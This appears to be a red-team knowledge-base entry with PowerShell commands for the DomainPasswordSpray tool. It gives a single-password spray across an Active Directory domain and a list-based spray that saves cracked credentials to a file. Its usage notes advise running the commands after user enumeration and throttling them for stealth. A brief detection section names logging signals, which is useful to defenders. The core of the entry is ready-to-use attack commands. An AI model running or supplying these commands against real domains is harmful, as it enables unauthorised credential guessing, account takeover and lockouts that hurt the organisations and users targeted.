---
id: 5216ce1d-a1af-42de-a978-220d813111b0
type: code
language: powershell
verified: true
created_at: '2023-04-06T03:56:04.297390+00:00'
updated_at: '2023-04-10T20:25:55.316905+00:00'
platforms:
  - Windows
tags:
  - password-spraying
  - active-directory
validated: true
---

# domain-password-spray-invoke-with-single-and-lists

## Code

```powershell
# https://github.com/dafthack/DomainPasswordSpray
Invoke-DomainPasswordSpray -Password Summer2021!
# /!\ be careful with the account lockout !
Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt
```

## Description

This PowerShell code provides examples for using DomainPasswordSpray: a single-password spray across the domain and a list-based spray with output. Includes warnings for lockout risks.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| Summer2021! | Single password to spray | Winter2023! |
| users.txt | User list file | admins.txt |
| domain-name | Domain FQDN | contoso.com |
| passlist.txt | Password list file | common.txt |
| sprayed-creds.txt | Output file | results.txt |

## Usage

Import the module from GitHub, then execute for quick common password tests or targeted list spraying. Use in red team ops after user enum; throttle for stealth.

## Detection

- PowerShell script block logging capturing Invoke-DomainPasswordSpray.
- Kerberos AS-REQ floods in event logs (4768).
- Unusual auth patterns from internal hosts.

## Related

- [[procedures/Password-Spraying-with-Pre-Generated-Passwords]]
- [[DomainPasswordSpray]]
